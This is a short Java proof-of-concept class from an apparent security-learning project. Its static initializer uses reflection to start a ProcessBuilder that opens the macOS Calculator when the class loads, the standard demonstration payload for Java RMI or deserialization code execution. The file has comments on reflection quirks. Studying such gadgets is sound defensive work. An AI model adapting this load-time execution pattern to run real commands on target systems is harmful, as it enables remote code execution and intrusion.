package com.xjjlearning.hack.java.evil;

import java.rmi.Remote;
import java.util.Arrays;
import java.util.List;

/**
 * created by xjj on 2023/1/17
 */
public class PocWithProcessBuilder implements Remote {
    static {
        try {
            Class<?> clazz = Class.forName("java.lang.ProcessBuilder");
            List<String> command = Arrays.asList("open", "/System/Applications/Calculator.app");

            // 1.mostly
            // 使用有参构造函数
            // clazz.getMethod("start").invoke(clazz.getConstructor(List.class).newInstance(command));

            // 2.mostly
            // 因为 newInstance() 接受的是可变长参数 而函数接受的也是可变长参数 所以使用二维数组 ??
            clazz.getMethod("start").invoke(clazz.getConstructor(String[].class)
                    .newInstance(new String[][]{{"open", "/System/Applications/Calculator.app"}}));

            // 2.Sometimes it doesn't work, because the cast of (ProcessBuilder)
            // ProcessBuilder builder = (ProcessBuilder) clazz.getConstructor(List.class).newInstance(command);
            // builder.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        System.out.println(1);
    }
}
